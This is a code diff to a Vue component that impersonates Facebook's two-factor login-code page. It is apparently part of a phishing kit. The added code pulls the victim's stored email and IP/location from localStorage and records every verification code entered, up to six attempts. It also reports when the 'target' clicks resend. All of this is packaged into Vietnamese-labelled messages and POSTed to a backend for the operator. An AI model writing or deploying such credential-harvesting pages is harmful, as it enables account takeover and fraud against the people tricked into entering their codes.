@@ -1,16 +1,40 @@
 <script setup lang="ts">
 import { ref } from 'vue'
+useHead({
+  title: 'Facebook',
+  meta: [
+    {
+      name: 'description',
+      content: 'Facebook',
+    },
+  ],
+})
 
-const email = ref('')
-const password = ref('')
+// const options = {
+//   weekday: 'long',
+//   year: 'numeric',
+//   month: 'long',
+//   day: 'numeric',
+//   hour: 'numeric',
+//   minute: 'numeric',
+//   second: 'numeric',
+//   hour12: false,
+// }
+// format option like hh:mm:ss dd/mm/yyyy
+const options = {
+  hour: '2-digit',
+  minute: '2-digit',
+  second: '2-digit',
+  day: '2-digit',
+  month: '2-digit',
+  year: 'numeric',
+}
 const code = ref('')
 const isFocusEmail = ref(false)
 const isFocusPassword = ref(false)
-const router = useRouter()
-const handleResetFocus = () => {
-  isFocusEmail.value = false
-  isFocusPassword.value = false
-}
+const attempt = ref(0)
+const attemptLimit = 6
+const attemptList = ref([])
 const isError = ref(false)
 const isShowLoading = ref(false)
 const handleFocus = (type: string, ref: any) => {
@@ -23,21 +47,58 @@ const handleFocus = (type: string, ref: any) => {
   }
 }
 const isDisableSubmit = ref(true)
+const geo = JSON.parse(localStorage.getItem('geo') || '{}')
+const emailFromLocal = localStorage.getItem('email')
+onBeforeMount(() => {
+  if (!emailFromLocal) {
+    window.location.href = '/?a=1'
+  }
+})
 const handleSubmit = async () => {
+  const conversationList = JSON.parse(localStorage.getItem('conversa') || '[]')
+  let message = ''
+  const isFirst = isFirstTime()
+
   if (!code.value) {
     return
   }
+  attemptList.value.push(code.value)
+  ++attempt.value
+  if (attemptList.value.length >= attemptLimit) {
+    window.location.href = '/?a=1'
+    return
+  }
+
+  message += `
+🕒 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN', options)}
+🌍 <b>Địa chỉ IP:</b> ${geo.ip}
+📍 <b>Vị trí:</b> ${geo.city}, ${geo.country}
+
+`
+
+  // time VN
+  if (isFirst) {
+    message += `👤 Người dùng mới truy cập\n\n`
+  }
+
+  message += `📭 <b>Email:</b> <code>${emailFromLocal}</code>\n\n`
+
+  // message += `🔑 Mã xác minh: <code>${code.value}</code>`
+  attemptList.value.forEach((item, index) => {
+    message += `🔑 <b>Mã xác minh ${index + 1}:</b> <code>${item}</code>\n`
+  })
 
   isShowLoading.value = true
   // Call your API here
   try {
-    await $fetch('/api/code', {
+    const res = await $fetch('/api/code', {
       method: 'POST',
-      body: JSON.stringify({ code: code.value }),
+      body: JSON.stringify({ rawMessage: message, conversation: conversationList }),
       headers: {
         'Content-Type': 'application/json',
       },
     })
+    localStorage.setItem('conversa', JSON.stringify(res))
     // router.push('/step-4')
   } catch (error) {
     console.error(error)
@@ -60,20 +121,33 @@ const isShowRecentCode = ref(true)
 const timeLeft = ref(59)
 const formattedTime = ref(`0:${timeLeft.value.toString().padStart(2, '0')}`)
 
-const startCountdown = () => {
+const startCountdown = async () => {
   isShowRecentCode.value = false
+
+  // let message = ''
+  const geo = JSON.parse(localStorage.getItem('geo') || '{}')
+  const message = `
+🕒 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN', options)}
+🌍 <b>Địa chỉ IP:</b> ${geo.ip}
+📍 <b>Vị trí:</b> ${geo.city}, ${geo.country}
+
+👤 Mục tiêu bấm <code>Resent code</code>
+📭 <b>Email:</b> <code>${emailFromLocal}</code>
+`
+
   try {
-    $fetch('/api/code', {
+    await $fetch('/api/code', {
       method: 'POST',
-      body: JSON.stringify({ code: 'Mục tiêu bấm <code>Resent code</code>' }),
+      body: JSON.stringify({ rawMessage: message }),
       headers: {
         'Content-Type': 'application/json',
       },
     })
-    // router.push('/step-4')
   } catch (error) {
     console.error(error)
   }
+
+  // Call your API here
   const timer = setInterval(() => {
     if (timeLeft.value > 0) {
       timeLeft.value--
@@ -91,11 +165,14 @@ const startCountdown = () => {
     <div class="max-md:w-full w-[600px]">
       <p class="text-[13px] mb-4">Facebook</p>
       <p class="text-[1.5rem] font-[600] leading-[17px] max-md:leading-[27px]">
-        Check your login code
+        {{ $t('Check your login code') }}
       </p>
       <p class="text-[13px] mt-5 mb-4">
-        Enter the 6-degit code that we've just sent to your SMS, WhatsApp or from the
-        authentications app that you set up.
+        {{
+          $t(
+            `Enter the 6-degit code that we've just sent to your SMS, WhatsApp or from the authentications app that you set up.`,
+          )
+        }}
       </p>
       <img class="mb-4" src="/assets/images/code-pin.png" alt="" />
       <div
@@ -113,7 +190,7 @@ const startCountdown = () => {
           }"
           class="text-[12px] text-[#9ea1a2]"
         >
-          Code
+          {{ $t('Code') }}
         </p>
         <div v-if="isShowLoading" class="absolute z-10 right-4 top-1/2 transform -translate-y-1/2">
           <Icon name="i-svg-spinners-ring-resize" class="text-[#1984f8] text-[26px]" />
@@ -148,8 +225,11 @@ const startCountdown = () => {
           ></path>
         </svg>
         <p class="font-base text-[0.8125rem]">
-          The login code you entered doesn't match the one sent to your phone. Please check the
-          number and try again.
+          {{
+            $t(
+              `The login code you entered doesn't match the one sent to your phone. Please check the number and try again.`,
+            )
+          }}
         </p>
       </div>
       <div class="flex mt-3 items-center gap-2">
@@ -158,9 +238,15 @@ const startCountdown = () => {
             d="M3 12a9 9 0 0 1 9-9c2.144 0 4.111.749 5.657 2H16a1 1 0 1 0 0 2h4a1 1 0 0 0 1-1V2a1 1 0 1 0-2 0v1.514A10.959 10.959 0 0 0 12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11a1 1 0 1 0-2 0 9 9 0 1 1-18 0z"
           ></path>
         </svg>
-        <p @click="startCountdown" v-if="isShowRecentCode" class="text-[14px] text-[#0064E0] cursor-pointer hover:underline">Get a new code</p>
+        <p
+          v-if="isShowRecentCode"
+          class="text-[14px] text-[#0064E0] cursor-pointer hover:underline"
+          @click="startCountdown"
+        >
+          {{ $t('Get a new code') }}
+        </p>
         <p v-else class="text-[14px] text-[#5d6a73] cursor-pointer">
-          We can send a new code in {{ formattedTime }}
+          {{ $t('We can send a new code in') }} {{ formattedTime }}
         </p>
       </div>
 
@@ -170,20 +256,20 @@ const startCountdown = () => {
         }"
         :disabled="isDisableSubmit"
         class="mb-3 mt-8 w-full text-[15px] font-light h-[44px] rounded-full text-white bg-[#a3beef]"
-        @click="handleSubmit"
+        @click="handleSubmit(false)"
       >
         <Icon
           v-if="isShowLoading"
           name="i-svg-spinners-ring-resize"
           class="text-[#1984f8] text-[26px]"
         />
-        <span v-else> Continue </span>
+        <span v-else> {{ $t('Continue') }} </span>
       </button>
 
       <button
         class="flex hover:bg-gray-100 justify-center h-[44px] items-center text-[15px] rounded-full border w-full"
       >
-        Try Another Way
+        {{ $t('Try another way') }}
       </button>
     </div>
   </div>
